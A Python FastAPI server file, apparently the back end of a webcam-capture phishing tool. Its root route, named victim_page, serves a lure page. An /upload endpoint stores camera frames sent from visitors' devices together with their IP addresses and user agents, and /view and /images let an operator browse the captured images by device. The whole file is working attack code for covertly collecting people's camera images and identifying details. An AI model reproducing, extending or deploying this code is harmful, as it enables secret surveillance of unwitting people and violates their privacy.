from fastapi import FastAPI, UploadFile, Form, Request, File
from fastapi.responses import HTMLResponse, JSONResponse, Response
from fastapi.staticfiles import StaticFiles
from pathlib import Path
import uuid
import time

app = FastAPI()

# Serve arquivos estáticos da pasta "static" (JS, CSS, etc)
app.mount("/static", StaticFiles(directory="static"), name="static")

TEMPLATES_DIR = Path(__file__).parent / "templates"
IMAGES_DIR = Path(__file__).parent / "images"
IMAGES_DIR.mkdir(exist_ok=True)

import numpy as np
from io import BytesIO
from PIL import Image
# Dicionário para armazenar dados dos clientes (device_id como chave)
clients = {}

@app.get("/", response_class=HTMLResponse)
async def victim_page():
    return HTMLResponse((TEMPLATES_DIR / "index.html").read_text(encoding="utf-8"))

@app.get("/view", response_class=HTMLResponse)
async def view_page():
    return HTMLResponse((TEMPLATES_DIR / "view.html").read_text(encoding="utf-8"))

@app.post("/upload")
async def upload_image(
    request: Request,
    frame: UploadFile = File(...),
    device_id: str = Form(None),
    user_agent: str = Form("")
):
    content = await frame.read()
    client_ip = request.client.host

    if not device_id:
        device_id = str(uuid.uuid4())

    now = time.time()
    client = clients.get(device_id, {})
    # Atualiza dicionário clients com último frame e info
    client.update({
        "image_bytes": content,
        "timestamp": now,
        "ip": client_ip,
        "user_agent": user_agent,
    })

    # Salva thumbnail a cada 3 segundos
    last_thumb = client.get("thumbnail_timestamp", 0)
    if now - last_thumb > 3:
        client["thumbnail_bytes"] = content
        client["thumbnail_timestamp"] = now
        # Salva a thumbnail no disco (opcional)
        thumb_path = IMAGES_DIR / f"{device_id}_thumb.jpg"
        with open(thumb_path, "wb") as f:
            f.write(content)

    # Salva a imagem no disco (opcional)
    path = IMAGES_DIR / f"{device_id}.jpg"
    with open(path, "wb") as f:
        f.write(content)

    clients[device_id] = client
    return {"status": "ok", "device_id": device_id, "client_ip": client_ip}

@app.get("/images")
async def list_images():
    response = []
    for device_id, data in clients.items():
        response.append({
            "device_id": device_id,
            "timestamp": data["timestamp"],
            "ip": data["ip"],
            "url": f"/image/{device_id}",
            "user_agent": data.get("user_agent", "N/A"),
            "source": data.get("source", "http"),
        })
    response = sorted(response, key=lambda x: x["timestamp"], reverse=True)
    return JSONResponse(response)

@app.get("/image/{device_id}")
async def get_image(device_id: str):
    data = clients.get(device_id)
    if not data:
        return JSONResponse({"error": "Not found"}, status_code=404)
    img_bytes = data.get("image_bytes")
    # Verifica se o frame é preto (imagem toda preta)
    is_black = False
    if img_bytes:
        try:
            img = Image.open(BytesIO(img_bytes)).convert("L")
            arr = np.array(img)
            if arr.max() == 0:
                is_black = True
        except Exception:
            pass
    # Se frame for preto ou não houver imagem, retorna thumbnail
    if not img_bytes or is_black:
        thumb = data.get("thumbnail_bytes")
        if thumb:
            return Response(content=thumb, media_type="image/jpeg")
        else:
            return JSONResponse({"error": "No image"}, status_code=404)
    return Response(content=img_bytes, media_type="image/jpeg")
